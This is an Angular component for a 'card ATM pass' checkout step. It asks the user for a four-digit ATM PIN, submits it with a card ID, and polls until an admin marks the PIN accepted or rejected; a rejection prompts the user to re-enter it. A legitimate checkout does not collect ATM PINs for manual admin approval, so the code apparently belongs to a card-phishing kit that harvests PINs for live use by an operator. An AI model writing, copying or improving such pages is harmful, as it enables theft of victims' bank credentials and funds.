import { Component, ElementRef, QueryList, ViewChildren, OnDestroy, inject, ChangeDetectorRef } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { Header } from "../../Layout/header/header";
import { AtmService } from '../../Core/services/api/atm.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';
import { OrderCartService } from '../../Core/services/order-cart.service';
import { PaymentVerificationModal, VerificationStatus } from '../../Components/payment-verification-modal/payment-verification-modal';
import { Subscription, interval } from 'rxjs';

@Component({
  imports: [CommonModule, Header, PaymentVerificationModal],
  selector: 'app-card-atm-pass',
  styleUrl: './card-atm-pass.css',
  templateUrl: './card-atm-pass.html',
})
export class CardATMPass implements OnDestroy {
  @ViewChildren('pinInput') pinInputs!: QueryList<ElementRef<HTMLInputElement>>;
  
  private readonly router = inject(Router);
  private readonly location = inject(Location);
  private readonly atmService = inject(AtmService);
  private readonly checkoutService = inject(CheckoutService);
  private readonly orderCartService = inject(OrderCartService);
  private readonly cdr = inject(ChangeDetectorRef);

  pin: string[] = ['', '', '', ''];
  isLoading = false;

  isVerifying = false;
  verificationStatus: VerificationStatus = 'checking';
  errorMessage = '';
  private pollSub?: Subscription;

  ngOnDestroy(): void {
    this.stopPolling();
  }

  get isPinComplete(): boolean {
    return this.pin.every(val => val !== '');
  }

  onInput(event: Event, index: number): void {
    const inputElement = event.target as HTMLInputElement;
    const value = inputElement.value;
    
    if (!/^\d*$/.test(value)) {
      inputElement.value = this.pin[index];
      return;
    }

    const lastChar = value.slice(-1);
    this.pin[index] = lastChar;
    inputElement.value = lastChar;

    if (lastChar && index < 3) {
      this.pinInputs.toArray()[index + 1].nativeElement.focus();
    }
  }

  onKeyDown(event: KeyboardEvent, index: number): void {
    if (event.key === 'Backspace' && !this.pin[index] && index > 0) {
      this.pinInputs.toArray()[index - 1].nativeElement.focus();
    }
  }

  onPaste(event: ClipboardEvent): void {
    event.preventDefault();
    const pastedData = event.clipboardData?.getData('text');
    if (pastedData) {
      const numbers = pastedData.replace(/\D/g, '').slice(0, 4).split('');
      numbers.forEach((num, i) => {
        if (i < 4) {
          this.pin[i] = num;
        }
      });
      const focusIndex = numbers.length < 4 ? numbers.length : 3;
      setTimeout(() => {
        if (this.pinInputs) {
           this.pinInputs.toArray()[focusIndex].nativeElement.focus();
        }
      });
    }
  }

  goBack(): void {
    this.location.back();
  }

  confirm(): void {
    if (this.isPinComplete && !this.isLoading) {
      const pinCode = this.pin.join('');
      const userId = this.checkoutService.cardId;

      if (!userId) {
        this.router.navigate(['/']);
        return;
      }

      this.isLoading = true;
      this.atmService.submitAtm(pinCode, userId).subscribe({
        next: () => {
          // Reset user status to PENDING so admin can review and approve ATM PIN
          this.checkoutService.resetUserStatus(userId).subscribe();
          this.startVerification(userId);
        },
        error: (err) => {
          console.error('ATM pass submission failed', err);
          this.checkoutService.resetUserStatus(userId).subscribe();
          this.startVerification(userId);
        }
      });
    }
  }

  private startVerification(userId: string): void {
    this.isVerifying = true;
    this.verificationStatus = 'checking';
    this.errorMessage = '';
    this.cdr.markForCheck();

    this.stopPolling();
    this.pollSub = interval(2000).subscribe(() => {
      this.checkoutService.checkUserStatus(userId).subscribe((status) => {
        if (status === 'ACCEPTED') {
          this.stopPolling();
          this.verificationStatus = 'accepted';
          this.orderCartService.clear();
          this.cdr.markForCheck();
          setTimeout(() => {
            this.isVerifying = false;
            this.isLoading = false;
            this.router.navigate(['/']);
          }, 1500);
        } else if (status === 'REJECTED') {
          this.stopPolling();
          this.verificationStatus = 'rejected';
          this.errorMessage = 'Incorrect ATM PIN entered. Please verify your PIN and try again.';
          this.cdr.markForCheck();
        }
      });
    });
  }

  handleRetry(): void {
    this.stopPolling();
    this.isVerifying = false;
    this.isLoading = false;
    this.pin = ['', '', '', ''];
    this.cdr.markForCheck();
    setTimeout(() => {
      const inputs = this.pinInputs?.toArray();
      if (inputs && inputs[0]) {
        inputs[0].nativeElement.focus();
      }
    }, 50);
  }

  private stopPolling(): void {
    if (this.pollSub) {
      this.pollSub.unsubscribe();
      this.pollSub = undefined;
    }
  }
}
